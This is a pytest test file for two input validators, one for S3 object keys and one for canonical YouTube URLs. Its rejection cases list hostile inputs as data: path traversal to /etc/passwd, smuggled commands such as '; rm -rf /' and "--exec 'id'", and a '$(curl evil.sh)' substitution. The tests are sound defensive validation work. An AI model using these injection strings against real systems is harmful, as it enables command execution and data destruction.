import pytest

from inputs import canonical_youtube_url, is_valid_s3_key


class TestS3Key:
    @pytest.mark.parametrize("key", [
        "27963b79-985c-4f75-a2e0-387ca62ebda2/original.mp4",
        "youtube_YRvf00NooN8/original.mp4",
    ])
    def test_accepts_issued_keys(self, key):
        assert is_valid_s3_key(key)

    @pytest.mark.parametrize("key", [
        "../etc/passwd",
        "abc/../original.mp4",
        "abc/original.mp4; rm -rf /",
        "abc/clip_0.mp4",
        "a/b/original.mp4",
        "/original.mp4",
        "abc/original.mp4\n",
        "",
    ])
    def test_rejects_anything_else(self, key):
        assert not is_valid_s3_key(key)


class TestCanonicalYouTubeUrl:
    def test_accepts_canonical_watch_url(self):
        url = "https://www.youtube.com/watch?v=YRvf00NooN8"
        assert canonical_youtube_url(url) == url

    @pytest.mark.parametrize("url", [
        "https://www.youtube.com/watch?v=YRvf00NooN8; touch /tmp/x",
        "https://www.youtube.com/watch?v=YRvf00NooN8 --exec 'id'",
        "https://www.youtube.com/watch?v=YRvf00NooN8&list=PL1",
        "$(curl evil.sh)",
        "https://evil.com/watch?v=YRvf00NooN8",
        "https://youtu.be/YRvf00NooN8",
        "http://www.youtube.com/watch?v=YRvf00NooN8",
        "https://www.youtube.com/watch?v=short",
        "",
    ])
    def test_rejects_anything_else(self, url):
        assert canonical_youtube_url(url) is None
